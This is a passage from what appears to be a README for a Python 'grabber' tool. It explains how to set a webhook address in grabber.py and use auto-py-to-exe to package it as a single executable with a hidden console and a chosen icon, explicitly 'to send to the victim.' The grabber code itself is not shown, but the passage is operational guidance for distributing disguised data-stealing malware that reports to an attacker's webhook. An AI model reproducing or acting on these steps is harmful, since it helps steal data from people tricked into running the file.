```
or normally download the ZIP file from **Code > Download ZIP**

- Open up the folder with the script
- Install dependencies

```bash
  pip install -r requirements.txt
```

- 🚩 Open the `grabber.py` in a Text Editor **Notepad or better VSC** and edit the **__Webhook address and the name__**
- 🚩 I recommend you to **convert** the script to .exe before sending it to the victim **(Tutorial below)**
## 💾 How to Convert and Config
- Install `auto-py-to-exe` with pip

```bash
  pip install auto-py-to-exe
```

- Build the executable file (opens GUI)

```bash
auto-py-to-exe
```
## ⚙️ EXE Configuration
- Select the path to the `grabber.py`
- Select **ONEFILE** option! (--onefile)
- Select **Hide the console** (--windowed)
- Select **an icon** (must be .ICO) (--icon)
- In advanced input .exe **file name** (--name)
- Hit the Convert Button! THAT'S ALL

You should get an **executable file (.exe)** that you can send to the victim. ✅
